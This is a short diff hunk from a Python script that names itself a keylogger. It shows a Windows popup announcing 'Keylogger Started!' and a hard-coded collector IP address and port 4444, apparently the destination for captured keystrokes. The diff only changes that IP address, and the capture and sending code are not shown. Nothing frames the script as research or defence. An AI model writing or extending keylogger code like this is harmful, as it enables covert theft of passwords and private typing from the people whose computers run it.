@@ -17,7 +17,7 @@ import os
 # Popup confirmation (so you know it's running)
 ctypes.windll.user32.MessageBoxW(0, "✅ Keylogger Started!", "Logger", 0)
 
-IP = "192.168.0.106"
+IP = "192.168.159.134"
 PORT = 4444
 log = ""
 
